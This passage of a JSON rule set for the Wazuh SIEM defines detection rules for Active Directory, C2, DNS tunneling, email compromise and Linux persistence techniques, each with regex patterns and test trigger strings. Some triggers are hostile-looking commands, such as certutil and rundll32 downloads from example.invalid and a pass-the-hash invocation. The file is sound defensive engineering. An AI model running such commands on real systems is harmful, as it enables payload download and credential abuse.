+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(certify|certipy|pkiview|certutil.*-ca\\b|adcs.*vuln|getTGTpkinit)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "certipy adcs vuln certify pkiview getTGTpkinit",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100706",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1649]: Certificate request by machine account - validate ESC context",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "adcs_abuse"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4886$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.requester",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100707",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1140/T1105]: CertUtil encode/decode/download pattern",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\bcertutil\\b.*(encode|decode|-urlcache|-f\\s+http)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "certutil -urlcache -f http://example.invalid/payload.bin",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101007",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1649]: ADCS certificate issued/denied/template/configuration event",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "adcs_abuse"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(4887|4888|4898|4899|4900)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100720",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DISCOVERY [T1069.002/T1087.002]: BloodHound or AD enumeration collector",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "discovery",
+                                     "bloodhound"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(SharpHound|bloodhound|invoke-bloodhound|AzureHound|ADCollector)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "SharpHound invoke-bloodhound AzureHound ADCollector",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100721",
+                      "level":  9,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DISCOVERY [T1069.002]: Domain admin group enumeration",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "discovery"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(net\\s+group\\s+\"domain admins\"|Get-DomainGroupMember|Get-DomainUser.*admincount)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "net group \"domain admins\" /domain",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100722",
+                      "level":  9,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DISCOVERY [T1087.002]: AD enumeration via native/admin tools",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "discovery"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(ldifde|csvde|adfind|dsquery|nltest.*domain_trusts)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "ldifde csvde adfind dsquery nltest /domain_trusts",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100735",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1550.002]: Pass-the-Hash tool/command indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "pth",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(sekurlsa::pth|invoke-pth|pass.*hash|pth-winexe|crackmapexec.*-H\\s+[a-f0-9]{32})"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "sekurlsa::pth invoke-pth pass the hash crackmapexec -H 0123456789abcdef0123456789abcdef",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100736",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1550.003]: Pass-the-Ticket tool/command indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "ptt",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(rubeus.*ptt|kerberos::ptt|invoke-ptt|mimikatz.*ticket)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "rubeus ptt kerberos::ptt invoke-ptt mimikatz ticket",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100737",
+                      "level":  5,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "LATERAL MOVEMENT [T1550.002]: Network logon with NTLM - base signal",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "pth",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4624$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.logonType",
+                                         "type":  "pcre2",
+                                         "pattern":  "^3$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.authenticationPackageName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)^NTLM$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101008",
+                      "level":  12,
+                      "frequency":  5,
+                      "timeframe":  300,
+                      "description":  "LATERAL MOVEMENT [T1550.002]: Repeated NTLM network logons for same user",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+                                             "100737"
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "lateral_movement",
+                                     "pth"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100750",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Cobalt Strike indicator in command line",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "cobaltstrike",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\b(cobaltstrike|cobalt\\s+strike|beacon\\.exe|cs\\.jar|teamserver)\\b"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "cobaltstrike cobalt strike beacon.exe cs.jar teamserver",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100751",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Modern C2 framework indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\b(sliver|havoc\\s+framework|brute\\s+ratel|nighthawk\\.exe|deimos\\.exe)\\b"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "sliver havoc framework brute ratel nighthawk.exe deimos.exe",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100752",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Metasploit/Meterpreter indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\b(meterpreter|metasploit|msf.*handler|multi\\/handler)\\b"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "meterpreter metasploit msf handler multi/handler",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100753",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2/INGRESS [T1105/T1218]: LOLBAS used with HTTP(S)",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(rundll32|regsvr32|regasm|installutil)\\.exe.*https?:"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "rundll32.exe http://example.invalid/a.dll regsvr32.exe https://example.invalid/a.sct",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101009",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071]: Sysmon network connection by LOLBAS process",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "lolbas",
+                                     "sysmon_lolbas_net"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^3$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.image",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(powershell|pwsh|cmd|rundll32|regsvr32|mshta|certutil)\\.exe$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100765",
+                      "level":  6,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071.004]: Long DNS subdomain - base signal",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "dns"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "dns_tunnel"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.dns.question.name",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)([a-z0-9]{40,}\\.|[a-f0-9]{32,}\\.)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100766",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071.004]: Known DNS tunneling tool",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "dns_tunnel"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(iodine|dnscat|dns2tcp|dns\\s+tunnel|dnstunnel)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "iodine dnscat dns2tcp dns tunnel dnstunnel",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100767",
+                      "level":  6,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "C2 [T1071.004]: Deep DNS TXT/NULL/CNAME query - base signal",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "dns"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "dns_tunnel"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.dns.question.type",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(TXT|NULL|CNAME)$"
+                                     },
+                                     {
+                                         "name":  "data.dns.question.name",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)([a-z0-9]{20,}\\.){3,}"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101010",
+                      "level":  13,
+                      "frequency":  20,
+                      "timeframe":  300,
+                      "description":  "C2 [T1071.004]: Potential DNS tunneling - repeated suspicious DNS queries from same source",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "dns_tunnel"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "c2",
+                                     "dns_tunnel"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100766"
+                                               ]
+                  },
+                  {
+                      "id":  "100780",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "BEC [T1114.003]: Suspicious inbox rule - forwarding/delete/move",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "office365,exchange"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "bec",
+                                     "email"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.operation",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(New-InboxRule|Set-InboxRule)"
+                                     },
+                                     {
+                                         "name":  "data.parameters",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(ForwardTo|RedirectTo|DeleteMessage|MoveToFolder)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100781",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "BEC [T1098]: Mailbox full access granted",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "office365"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "bec",
+                                     "email"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.operation",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(Add-MailboxPermission|Add-RecipientPermission)"
+                                     },
+                                     {
+                                         "name":  "data.parameters",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)FullAccess"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100782",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "BEC [T1114.003]: Mailbox forwarding configured",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "office365"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "bec",
+                                     "email"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.operation",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)Set-Mailbox"
+                                     },
+                                     {
+                                         "name":  "data.parameters",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(ForwardingAddress|ForwardingSMTPAddress|DeliverToMailboxAndForward)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101011",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "IDENTITY [T1098/T1550]: Suspicious OAuth/app or identity permission change",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "office365,azure,entra"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "bec",
+                                     "identity",
+                                     "cloud"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.operation",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(Consent to application|Add service principal|Add app role assignment|Add delegated permission grant|Update user)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100795",
+                      "level":  10,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1547.006]: Suspicious kernel module command - tune with auditd/FIM",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "linux",
+                                     "rootkit"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(insmod|modprobe|rmmod)\\s+.*(rootkit|hide|hook|stealth)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100796",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1053.003]: Cron file modification",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "syscheck"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "linux",
+                                     "cron"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "file",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(/etc/cron\\.d/|/etc/cron\\.daily/|/var/spool/cron/|/etc/crontab)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100797",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1548.003]: Sudo/setuid privilege escalation command pattern",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "linux",
+                                     "sudo"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(echo.*ALL.*NOPASSWD|visudo.*echo|chmod.*4755.*(sudo|bash|sh)|setcap\\s+cap_setuid)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100798",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1098.004]: SSH authorized_keys modified",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "syscheck"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "linux",
+                                     "ssh"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "file",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(/root|/home/[^/]+)/\\.ssh/authorized_keys$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100799",
+                      "level":  10,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1222.002]: Immutable bit set on critical system file",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "linux"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(chattr\\s+\\+i|lsattr.*-i)\\s+.*(passwd|shadow|sudoers)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100800",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1574.006]: LD_PRELOAD hijacking",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "linux",
+                                     "rootkit"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(LD_PRELOAD=|export\\s+LD_PRELOAD|\\/etc\\/ld\\.so\\.preload)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100801",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1136.001]: New suspicious Linux user account",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "linux"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "linux"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.command",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(useradd|adduser)\\s+.*(--no-create-home|-M)\\s+.*-s\\s+\\/bin\\/(bash|sh)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
